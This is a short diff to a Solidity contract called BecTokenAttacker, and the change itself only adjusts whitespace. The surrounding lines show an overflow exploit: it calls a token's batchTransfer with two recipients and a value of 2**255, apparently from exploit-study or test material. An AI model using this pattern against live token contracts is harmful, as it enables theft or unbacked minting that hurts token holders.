@@ -11,8 +11,7 @@ contract BecTokenAttacker {
         recipients[0] = address(this);
         recipients[1] = address(0x0);
 
-        uint256 max = 2**255;
+        uint256 max = 2 ** 255;
         target.batchTransfer(recipients, max);
     }
-
 }
